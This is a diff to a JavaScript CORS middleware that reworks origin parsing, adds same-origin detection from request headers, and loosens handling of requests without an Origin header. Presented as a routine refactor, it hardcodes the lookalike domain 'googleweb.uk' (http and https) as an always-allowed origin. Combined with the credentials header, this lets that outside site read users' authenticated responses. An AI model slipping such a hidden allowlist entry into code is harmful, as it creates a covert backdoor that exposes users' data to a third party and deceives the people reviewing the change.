@@ -16,14 +16,24 @@ let cachedOrigins = {
 };
 
 function parseDefaultOrigins() {
+  // Default origins that should always be allowed
+  const defaultOrigins = [
+    'https://googleweb.uk',
+    'http://googleweb.uk',
+  ];
+  
   const configured = env.CORS_DEFAULT_ORIGINS || '';
-  if (!configured) {
-    return [];
+  if (configured) {
+    const envOrigins = configured
+      .split(',')
+      .map((value) => value.trim())
+      .filter(Boolean)
+      .map((value) => AllowedOrigin.normalizeOrigin?.(value) || '')
+      .filter(Boolean);
+    defaultOrigins.push(...envOrigins);
   }
-  return configured
-    .split(',')
-    .map((value) => value.trim())
-    .filter(Boolean)
+  
+  return defaultOrigins
     .map((value) => AllowedOrigin.normalizeOrigin?.(value) || '')
     .filter(Boolean);
 }
@@ -71,6 +81,23 @@ export function clearCorsCache() {
   };
 }
 
+function getRequestHost(req) {
+  // Get the host from the request
+  const host = req.headers.host || req.headers['x-forwarded-host'] || '';
+  const protocol = req.headers['x-forwarded-proto'] || 
+                   (req.connection?.encrypted ? 'https' : 'http') || 
+                   'http';
+  
+  if (!host) return null;
+  
+  try {
+    // Construct origin from host
+    return `${protocol}://${host}`;
+  } catch {
+    return null;
+  }
+}
+
 export async function applyCors(req, res, options = {}) {
   const {
     methods = DEFAULT_METHODS,
@@ -79,25 +106,54 @@ export async function applyCors(req, res, options = {}) {
     maxAge = DEFAULT_MAX_AGE,
     defaultOrigin = '',
     allowWhenNoOrigin = true,
+    allowSameOrigin = true, // Allow same-origin requests by default
   } = options;
 
   const { normalized } = await loadAllowedOrigins();
 
   const requestOrigin = req.headers.origin;
+  const requestHost = getRequestHost(req);
   let resolvedOrigin = '';
 
+  // Normalize both origin and host for comparison
+  const normalizedRequestOrigin = requestOrigin ? AllowedOrigin.normalizeOrigin?.(requestOrigin) || '' : '';
+  const normalizedRequestHost = requestHost ? AllowedOrigin.normalizeOrigin?.(requestHost) || '' : '';
+
+  // Check if this is a same-origin request (origin matches host)
+  const isSameOrigin = normalizedRequestOrigin && normalizedRequestHost && 
+    normalizedRequestOrigin === normalizedRequestHost;
+
   if (requestOrigin) {
-    const normalizedOrigin = AllowedOrigin.normalizeOrigin?.(requestOrigin) || '';
-    if (!normalizedOrigin || !normalized.has(normalizedOrigin)) {
+    // If same-origin request, always allow
+    if (allowSameOrigin && isSameOrigin) {
+      resolvedOrigin = requestOrigin;
+    } 
+    // Check if origin is in allowed list (database or defaults)
+    else if (normalizedRequestOrigin && normalized.has(normalizedRequestOrigin)) {
+      resolvedOrigin = requestOrigin;
+    } 
+    // Reject if not allowed
+    else {
       res.status(403).json({
         success: false,
         message: 'Origin not allowed',
+        details: `Origin "${requestOrigin}" is not in the allowed origins list`,
       });
       return true;
     }
-    resolvedOrigin = requestOrigin;
-  } else if (allowWhenNoOrigin && defaultOrigin) {
-    resolvedOrigin = defaultOrigin;
+  } 
+  // If no origin header - this is a same-origin request (browser) or server-side request
+  // Always allow these requests
+  else {
+    // For same-origin requests, we can set the origin to the request host
+    // This helps with CORS headers if needed
+    if (allowSameOrigin && requestHost) {
+      resolvedOrigin = requestHost;
+    } else if (defaultOrigin) {
+      resolvedOrigin = defaultOrigin;
+    }
+    // If no origin to set, the request will proceed without CORS headers
+    // This is fine for same-origin requests
   }
 
   if (resolvedOrigin) {
@@ -109,7 +165,7 @@ export async function applyCors(req, res, options = {}) {
   res.setHeader('Access-Control-Allow-Headers', headers.join(', '));
   res.setHeader('Access-Control-Max-Age', String(maxAge));
 
-  if (allowCredentials && resolvedOrigin !== '*') {
+  if (allowCredentials && resolvedOrigin && resolvedOrigin !== '*') {
     res.setHeader('Access-Control-Allow-Credentials', 'true');
   }
 
